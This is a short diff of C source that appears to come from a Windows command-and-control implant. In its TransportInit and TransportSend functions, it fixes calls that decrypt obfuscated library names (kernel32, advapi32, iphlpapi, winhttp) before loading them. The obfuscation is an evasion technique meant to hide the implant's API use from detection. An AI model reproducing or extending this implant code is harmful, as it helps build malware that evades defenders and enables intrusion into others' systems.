@@ -56,17 +56,19 @@ BOOL TransportInit( ) {
 
 #if CONFIG_OBFUSCATION == TRUE
     // Get Computer name
-    unsigned char s_kernel32[] = S_KERNEL32;
+    unsigned char s_kernel32[] =S_KERNEL32;
     unsigned char s_advapi32[] = S_ADVAPI32;
     unsigned char s_iphlpapi[] = S_IPHLPAPI;
+
     unsigned char s_xkey[] = S_XK;
+
     unsigned char d_kernel32[14] = {0};
     unsigned char d_advapi32[14] = {0};
     unsigned char d_iphlpapi[14] = {0};
 
-    ROL_AND_DECRYPT((char *)s_kernel32, sizeof(s_kernel32), 1, d_kernel32, (char *)s_xkey, sizeof(s_xkey));
-    ROL_AND_DECRYPT((char *)s_advapi32, sizeof(s_advapi32), 1, s_advapi32, (char *)s_xkey, sizeof(s_xkey));
-    ROL_AND_DECRYPT((char *)s_iphlpapi, sizeof(s_iphlpapi), 1, s_iphlpapi, (char *)s_xkey, sizeof(s_xkey));
+    ROL_AND_DECRYPT((const char *)s_kernel32, sizeof(s_kernel32), 1, d_kernel32, (const char *)s_xkey);
+    ROL_AND_DECRYPT((const char *)s_advapi32, sizeof(s_advapi32), 1, d_advapi32, (const char *)s_xkey);
+    ROL_AND_DECRYPT((const char *)s_iphlpapi, sizeof(s_iphlpapi), 1, d_iphlpapi, (const char *)s_xkey);
 
     HANDLE p_kernel32 = LocalGetModuleHandle(d_kernel32);
     HANDLE p_advapi32 = LoadLibrary(d_advapi32);
@@ -249,7 +251,8 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_WINHTTP;
     unsigned char winhttp[sizeof(s_string)] = {0};
-    ROL_AND_DECRYPT((char *)s_string, sizeof(s_string), 1, winhttp, (char *)s_xk, sizeof(s_xk));
+
+    ROL_AND_DECRYPT((char *)s_string, sizeof(s_string), 1, winhttp, s_xk);
 
     //winhttp[11] = 0x00;
 
